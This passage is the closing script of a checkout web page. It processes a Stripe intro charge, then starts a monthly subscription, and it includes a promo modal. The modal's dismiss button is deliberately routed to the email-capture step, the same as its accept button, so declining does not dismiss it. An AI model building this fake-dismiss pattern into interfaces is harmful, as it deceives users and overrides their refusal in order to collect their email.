    function showError(m){$err.textContent=m;$err.style.display="block"}
    function hideError(){$err.textContent="";$err.style.display="none"}
    function showLoading(){overlay.setAttribute("aria-hidden","false")}
    function hideLoading(){overlay.setAttribute("aria-hidden","true")}

    document.getElementById("payNow").onclick=async()=>{
      hideError();showLoading();
      try{
        // 1) Create a PaymentMethod from Elements
        const pmRes = await stripe.createPaymentMethod({
          type:"card",
          card:cardNumber,
          billing_details:{name:nameInput.value,email:emailInput.value}
        });
        if(pmRes.error){ throw new Error(pmRes.error.message); }
        const paymentMethodId = pmRes.paymentMethod.id;

        // 2) Ask server to create the intro-charge PaymentIntent (gets client_secret)
        const r1 = await fetch(TRIAL_INTENT_URL,{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            paymentMethodId,
            name:nameInput.value,
            email:emailInput.value
          })
        });
        const d1 = await r1.json();
        if(!r1.ok || !d1.clientSecret){ 
          throw new Error(d1.error || "Payment failed while creating the intro charge."); 
        }

        // 3) Confirm the intro charge (SCA happens here if needed)
        const conf = await stripe.confirmCardPayment(d1.clientSecret);
        if(conf.error){ throw new Error(conf.error.message); }
        if(!(conf.paymentIntent && conf.paymentIntent.status==="succeeded")){
          throw new Error("Payment not completed");
        }

        // 4) Start the monthly subscription (server-configured)
        const r2 = await fetch(START_MONTHLY_URL,{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            paymentIntentId: conf.paymentIntent.id
          })
        });
        const d2 = await r2.json();
        if(!r2.ok){ throw new Error(d2.error || "Failed to start subscription"); }

        // 5) Success!
        window.location.href="thankyou2.html";
      }catch(err){
        showError(err.message || "Payment failed");
      }finally{
        hideLoading();
      }
    };

    /* ---------- Promo modal: route BOTH buttons to Step 1 (email) ---------- */
    (function promoModal(){
      const backdrop = document.getElementById('promo');
      const closeBtn = document.getElementById('promoClose');
      const dismissBtn = document.getElementById('promoDismiss');
      const acceptBtn = document.getElementById('promoAccept');

      const SEEN_KEY = 'promo_seen_v1';
      if(!sessionStorage.getItem(SEEN_KEY)){
        setTimeout(()=>backdrop.setAttribute('aria-hidden','false'), 600);
        sessionStorage.setItem(SEEN_KEY,'1');
      }

      function close(){ backdrop.setAttribute('aria-hidden','true'); }

      function goToEmailStep(){
        // Always show Step 1 (email) and hide Step 2
        document.getElementById('step1').setAttribute('aria-hidden','false');
        document.getElementById('step2').setAttribute('aria-hidden','true');
        window.scrollTo({top:0,behavior:'smooth'});
        close();
      }

      closeBtn.addEventListener('click', close);
      // Route BOTH buttons to Step 1 so you capture email first
      acceptBtn.addEventListener('click', goToEmailStep);
      dismissBtn.addEventListener('click', goToEmailStep);

      // Click outside to close (no navigation)
      backdrop.addEventListener('click', (e)=>{ if(e.target === backdrop) close(); });

      // Esc key to close (no navigation)
      document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') close(); });
    })();
  </script>
</body>
</html>
